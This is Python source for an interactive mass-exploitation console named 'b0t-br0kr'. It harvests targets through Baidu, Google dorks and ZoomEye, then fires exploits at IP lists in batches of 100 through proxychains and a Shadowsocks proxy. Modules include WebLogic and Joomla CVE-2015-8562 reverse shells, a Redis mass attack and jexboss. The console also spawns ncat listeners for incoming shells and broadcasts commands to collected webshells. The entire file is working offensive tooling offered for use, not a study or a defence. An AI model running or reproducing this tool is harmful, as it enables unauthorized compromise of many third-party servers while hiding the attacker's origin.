#!/usr/bin/python3

import sys
import os
import time
import signal
import subprocess
import util.console as console
import util.colors as colors
import util.webshell as ws
import util.baidu as baidu

# mark home for our way back
init_dir = os.getcwd()
proxy_conf = str(init_dir) + '/proxy.conf'

# default target list
ip_list = 'data/ip_list.txt'


# in case too many exploits being executed simultaneously, we need to
# terminate old ones before launching next 100
def check_kill_process(pstring):
    for line in os.popen("ps ax | grep " + pstring + " | grep -v grep"):
        fields = line.split()
        pid = fields[0]
        os.kill(int(pid), signal.SIGKILL)


def jexboss(cmd, exploit_path):
    global proxy_conf
    try:
        cmd = cmd.split()
        try:
            args = cmd[1:]
            subprocess.call(['proxychains4', '-q', '-f',
                             proxy_conf, exploit_path] + args)
        except:
            subprocess.call(['python', exploit_path, '-h'])
    except Exception as e:
        console.print_error(
            "[-] Error starting {}: ".format(exploit_path) + str(e))


def execute(cmd):
    global proxy_conf
    if cmd == '':
        pass
    elif cmd.startswith('baidu'):
        try:
            command = cmd.strip().split()
            dork = command[1]
            count = int(command[2])
            os.chdir('output')
            baidu.spider(dork, count)
            os.chdir(init_dir)
        except Exception as e:
            console.print_error('[-] Error with baidu: ' + str(e))
    elif cmd.lower() == 'target' or cmd.lower() == 't':
        print(colors.CYAN + ip_list + colors.END)
    elif cmd == 'proxy':
        if not os.path.exists('data/ss.json'):
            console.print_error('[-] Please make sure \"data/ss.json\" exists')
        try:
            subprocess.Popen(['./tools/ss-proxy', '-c', './data/ss.json'],
                             stderr=subprocess.PIPE,
                             stdout=subprocess.PIPE,
                             shell=False)
        except Exception as e:
            console.print_error(
                '[-] Error starting Shadowsocks proxy: ' + str(e))
    elif cmd.startswith('webshell'):
        try:
            command = cmd.strip().split()
            if command[1] == '-b':
                try:
                    ws.loadShells('webshell.list')
                    cmd = input(colors.CYAN + 'CMD >> ' + colors.END)
                    ws.broadcast(cmd)
                except Exception as e:
                    console.print_error(
                        '[-] Error with webshell broadcasting: ' + str(e))
            else:
                pass
        except:
            if cmd == 'webshell':
                try:
                    ws.loadShells('webshell.list')
                    shell = input('[*] Select a shell: ').strip()
                    ws.ctrl(shell)
                except Exception as e:
                    console.print_error('[-] Error with webshell: ' + str(e))
    elif cmd.lower() == 'redis':
        answ = input(
            '[*] Executing redis mass exploit against `targets`, proceed? [y/n] ')
        os.chdir('./exploits/redis/')
        if answ.lower() == 'y':
            subprocess.call(['proxychains4', '-q', '-f',
                             proxy_conf, 'python', 'massAttack.py'])
        else:
            pass
    elif cmd.startswith('google'):
        try:
            cmd = cmd.strip().split()
            dork = cmd[1]
            # well yes im a lazy guy
            subprocess.call(['./exploits/joomla/joomlaCVE-2015-8562.py',
                             '--dork', dork, '--revshell=\'127.0.0.1\'', '--port=4444'])
            pass
        except Exception as e:
            console.print_error(e)
    elif cmd.startswith('jexboss'):
        jexboss(cmd, './exploits/jexboss/jexboss.py')
    elif cmd.lower() == 'q':
        check_kill_process('ss-proxy')
        print("[+] Exiting...")
        sys.exit(0)
    elif cmd.lower() == 'h' or cmd.lower() == 'help' or cmd == '?':
        print(console.help)
    elif cmd == 'exploits':
        print(colors.CYAN + '[+] Available exploits: ' + colors.END)
        os.system('tree -f ./exploits')
    elif cmd == 'z' or cmd == "zoomeye":
        try:
            os.chdir('zoomeye')
            subprocess.call('zoomeye.py')
        except Exception as e:
            console.print_error('[-] Cannot start zoomeye.py:\n' + str(e))
    elif cmd == 'x' or cmd == 'clear':
        subprocess.call("clear")
    elif cmd == 'c' or cmd == 'reset':
        subprocess.call("reset")
    elif cmd.lower() == "exp" or cmd.lower() == "e":
        attack()
    else:
        try:
            print(
                colors.BLUE +
                colors.BOLD +
                "[*] Executing shell command: " +
                colors.END +
                colors.GREEN +
                cmd +
                colors.END +
                '\n')
            os.system(cmd)
        except Exception as e:
            console.print_error(
                "[-] Error executing shell command `{}`: ".format(cmd) + str(e))


scanner_args = []


def weblogic():
    print(colors.BLUE + '\n[*] Welcome to Weblogic exploit' + colors.END)
    shellServer = input(
        colors.BLUE +
        '[?] What\'s the IP of shell receiver? ' +
        colors.END)
    port = input(
        colors.BLUE +
        '[?] What\'s the port of shell receiver? ' +
        colors.END)
    server_port = input(
        colors.BLUE +
        '[?] What\'s the port of Weblogic server? ' +
        colors.END)

    # start scanner
    exploit = 'weblogic.py'
    work_path = '/weblogic/'
    exec_path = exploit
    os_type = str(
        input(
            colors.BLUE +
            '[?] Windows or Linux? [w/l] ' +
            colors.END))
    if os_type.lower() == 'w':
        custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os win'.format(
            shellServer, port, server_port).split()
    elif os_type.lower() == 'l':
        custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os linux'.format(
            shellServer, port, server_port).split()
    else:
        console.print_error('[-] Invalid input')
        return
    jobs = 100
    waitTime = 25
    scanner_args = (exploit, work_path, exec_path, custom_args, jobs, waitTime)
    scanner(scanner_args)


def redis():
    print(colors.BLUE + '\n[*] Welcome to Redis exploit' + colors.END)
    answ = input(
        '[*] Executing redis mass exploit against ./exploits/redis/targets, proceed? [y/n] ')
    os.chdir('./exploits/redis/')
    if answ.lower() == 'y':
        subprocess.call(['proxychains4', '-q', '-f',
                         proxy_conf, 'python', 'massAttack.py'])
    else:
        pass


def attack():
    global proxy_conf
    global scanner_args
    answ = str(
        input(
            colors.DARKCYAN +
            colors.BOLD +
            '\n[?] Do you wish to use\n\n    [a] built-in exploits\n    [m] or launch your own manually?\n\n[=] Your choice: ' +
            colors.END)).strip()
    if answ == 'a':
        print(
            colors.CYAN +
            colors.BOLD +
            '\n[?] Choose a module from: ' +
            colors.END +
            '\n')
        print(console.built_in)
        answ = int(
            input(
                colors.CYAN +
                colors.BOLD +
                '[=] Your choice: ' +
                colors.END))
        if answ == 2:
            redis()
        elif answ == 1:
            console.print_error('\n[-] Under development')
        elif answ == 0:
            weblogic()
        else:
            console.print_error('\n[-] Invalid input!')
    elif answ == 'm':
        print(
            colors.CYAN +
            colors.UNDERLINE +
            colors.BOLD +
            "\nWelcome, my fellow hacker! \n\n[+] First, let me know what you need\n" +
            colors.END)
        exploit = input(
            "    [*] Enter the path (eg. joomla/rce.py) of your exploit: ").strip()
        jobs = int(input("    [?] How many processes each time? "))
        custom_args = []
        answ = input("[?] Do you need a reverse shell [y/n]? ").strip()
        if answ == 'y':
            lhost = input(
                "    [*] Where do you want me to send shells? ").strip()
            lport = input(
                "    [*] and at what port? (make sure you have access to that port) ").strip()
            custom_args = ['-l', lhost, '-p', lport]
            answ = input('    [*] Do you need me to start a listener? [y/n] ')
            if answ == 'y':
                print("\n[*] Spawning ncat listener in new window...\n")
                try:
                    listener = subprocess.Popen(
                        args=[
                            "gnome-terminal",
                            "--command=ncat -nklvp " +
                            lport +
                            " -m 1000"],
                        shell=False,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)
                except:
                    print(
                        colors.YELLOW +
                        "[-] Could not launch our listener, do you have GNOME-Terminal installed?" +
                        colors.END +
                        '\n')
            else:
                print(
                    "    [*] Okay, just make sure you receive the reverse shells\n")
        else:
            pass
        custom_args += input(
            "    [*] args for this exploit (target IP is handled already) ").strip().split()
        exec_path = exploit.split('/')[1:]
        work_path = exploit.split('/')[:-1]
        d = '/'
        exec_path = d.join(exec_path)
        work_path = d.join(work_path)
        e_args = ['proxychains4', '-q', '-f', proxy_conf, './' + exec_path]
        d = ' '
        print(
            colors.BLUE +
            '    [*] Your exploit will be executed like\n' +
            '    ' +
            colors.END,
            'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(
                exec_path),
            d.join(custom_args))
        while True:
            try:
                waitTime = int(input(
                    "    [*] and How long do you want me to wait between every 100 targets? (make it longer to fully complete the exploitation) ").strip())
                break
            except:
                console.print_error("    [-] Invalid input")
                continue
        scanner_args = (
            exploit,
            work_path,
            exec_path,
            custom_args,
            jobs,
            waitTime)
        scanner(scanner_args)
    else:
        console.print_error('[-] Invalid input')


def scanner(scanner_args):
    global ip_list
    exploit, work_path, exec_path, custom_args, jobs, waitTime = scanner_args[
        0], scanner_args[1], scanner_args[2], scanner_args[3], scanner_args[4], scanner_args[5]
    '''
    d = ' '
    print('Exec: '+exec_path, 'work_path: '+work_path, '\nRun: '+d.join(e_args))
    time.sleep(10)
    '''
    e_args = [
        'proxychains4',
        '-q',
        '-f',
        proxy_conf,
        './exploits/' +
        work_path +
        exec_path]
    f = open(init_dir + '/' + ip_list)
    os.chdir('./exploits/' + work_path)
    # print(os.getcwd())
    console.print_warning('\n[!] It might be messy, get ready!' + '\n')
    time.sleep(3)
    count = 0
    tested = count
    rnd = 1
    for line in f:
        ip = line.strip()
        progress = colors.BLUE + colors.BOLD + 'ROUND.' + \
            str(rnd) + colors.END + '  ' + colors.CYAN + colors.BOLD + \
            str(tested + 1) + colors.END + ' targets found\n'
        try:
            sys.stdout.write('\r' + progress)
            sys.stdout.flush()
        except KeyboardInterrupt:
            exit()
        count += 1
        tested += 1
        if count == jobs or count == 0:
            count = 0
            rnd += 1
            time.sleep(waitTime)
            check_kill_process(exploit)
            continue
        else:
            try:
                e_args += ['-t', ip]
                e_args += custom_args
                proc = subprocess.Popen(e_args)
                time.sleep(.1)
                e_args = [
                    'proxychains4',
                    '-q',
                    '-f',
                    proxy_conf,
                    './' +
                    exec_path]
                sys.stdout.flush()
                os.system('clear')
            except:
                pass
    os.system('clear')
    os.chdir(init_dir)
    console.print_success('\n[+] All done!\n')
    print(console.intro)


def main():
    global ip_list
    answ = str(
        input(
            colors.CYAN +
            '[?] Use ip_list.txt as target list? [y/n] ' +
            colors.END)).strip()
    if answ.lower() == 'n':
        os.system("ls data")
        ip_list = 'data/' + str(
            input(
                colors.CYAN +
                '[=] Choose your target IP list (must be in ./data) ')).strip()
        if ip_list == 'data/':
            ip_list = 'data/ip_list.txt'
    else:
        pass
    while True:
        try:
            cmd = input(
                colors.CYAN +
                colors.BOLD +
                colors.UNDERLINE +
                "\nb0t-br0kr" +
                colors.END +
                colors.CYAN +
                colors.BOLD +
                " > " +
                colors.END)
            try:
                execute(cmd)
            except Exception as e:
                print(colors.RED + "[-] Error with command: ", e, colors.END)
        except KeyboardInterrupt:
            try:
                answ = input("\n[?] Are you sure to exit? [y/n] ")
            except KeyboardInterrupt:
                print("\n[-] Okay okay, exiting immediately...")
                check_kill_process('ss-proxy')
                sys.exit(0)
            if answ.lower() == 'y':
                print("\n[+] Exiting...")
                check_kill_process('ss-proxy')
                sys.exit(0)
            else:
                continue

if __name__ == "__main__":
    try:
        print(console.intro)
        main()
    except Exception as e:
        console.print_error('[-] Error at main: ' + str(e))
    except KeyboardInterrupt:
        console.print_error('[-] Exiting...')